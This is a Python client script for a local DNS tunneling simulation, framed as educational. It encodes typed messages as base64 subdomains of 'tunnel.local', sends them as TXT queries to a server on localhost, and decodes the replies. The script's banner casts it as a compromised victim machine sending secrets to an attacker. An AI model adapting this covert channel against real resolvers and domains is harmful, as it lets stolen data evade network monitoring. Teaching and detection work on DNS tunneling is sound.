#!/usr/bin/env python3
"""
DNS Tunneling Simulation - CLIENT SIDE
=======================================
Educational tool to demonstrate DNS tunneling concept.
Run AFTER the server is already running.

Requirements: pip install dnslib
Usage: python3 dns_client.py
"""

import base64
import socket
import time
from datetime import datetime

try:
    from dnslib import DNSRecord, QTYPE, DNSQuestion
except ImportError:
    print("[-] Missing dependency. Install it with:")
    print("    pip install dnslib")
    exit(1)

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5353
TUNNEL_DOMAIN = "tunnel.local"


def log(msg, color="\033[0m"):
    reset = "\033[0m"
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] {msg}{reset}")


def encode_message(message: str) -> str:
    """Encode message to base64, replace = with - for DNS safety."""
    encoded = base64.b64encode(message.encode()).decode()
    return encoded.replace("=", "-")


def decode_response(encoded: str) -> str:
    """Decode base64 response from server."""
    padded = encoded.replace("-", "=")
    return base64.b64decode(padded).decode("utf-8")


def send_dns_tunnel(message: str) -> str:
    """Send a message through DNS tunnel and return decoded response."""
    encoded = encode_message(message)
    query_domain = f"{encoded}.{TUNNEL_DOMAIN}"

    log(f"📤 Original message : '{message}'", "\033[96m")
    log(f"   Base64 encoded   : '{encoded}'", "\033[90m")
    log(f"   DNS query sent   : '{query_domain}'", "\033[93m")

    # Build DNS query
    query = DNSRecord.question(query_domain, qtype="TXT")
    query_bytes = query.pack()

    # Send via UDP (just like real DNS)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    try:
        sock.sendto(query_bytes, (SERVER_IP, SERVER_PORT))
        data, _ = sock.recvfrom(4096)

        # Parse response
        response = DNSRecord.parse(data)

        if response.rr:
            raw = str(response.rr[0].rdata).strip('"')
            decoded = decode_response(raw)
            log(f"📥 Server responded : '{decoded}'", "\033[92m")
            return decoded
        else:
            log("⚠️  No response data received", "\033[91m")
            return ""

    except socket.timeout:
        log("❌ Timeout - Is the server running?", "\033[91m")
        return ""
    finally:
        sock.close()


def print_banner():
    print("\033[94m")  # Blue
    print("=" * 60)
    print("   DNS TUNNELING SIMULATION - CLIENT (Victim)")
    print("   For Educational Purposes Only")
    print("=" * 60)
    print("\033[0m")
    print(f"  Server : {SERVER_IP}:{SERVER_PORT}")
    print(f"  Domain : *.{TUNNEL_DOMAIN}")
    print()
    print("  This simulates a compromised machine sending")
    print("  secret data to an attacker using DNS queries.")
    print()
    print("  Try commands: ping, hello, whoami, getkey")
    print("  Or type any custom message!")
    print("  Type 'demo' to run an automated demonstration.")
    print("  Type 'quit' to exit.")
    print()


def run_demo():
    """Automated demo showing multiple tunnel messages."""
    demo_messages = ["ping", "whoami", "getkey", "hello"]
    print()
    log("🎬 Running automated demo...", "\033[95m")
    print()

    for msg in demo_messages:
        log(f"--- Tunneling: '{msg}' ---", "\033[95m")
        send_dns_tunnel(msg)
        print()
        time.sleep(1)

    log("✅ Demo complete!", "\033[92m")


if __name__ == "__main__":
    print_banner()

    while True:
        try:
            user_input = input("\033[97m> Enter message to tunnel: \033[0m").strip()

            if not user_input:
                continue
            elif user_input.lower() == "quit":
                log("👋 Exiting.", "\033[91m")
                break
            elif user_input.lower() == "demo":
                run_demo()
            else:
                print()
                send_dns_tunnel(user_input)
                print()

        except KeyboardInterrupt:
            print()
            log("👋 Exiting.", "\033[91m")
            break
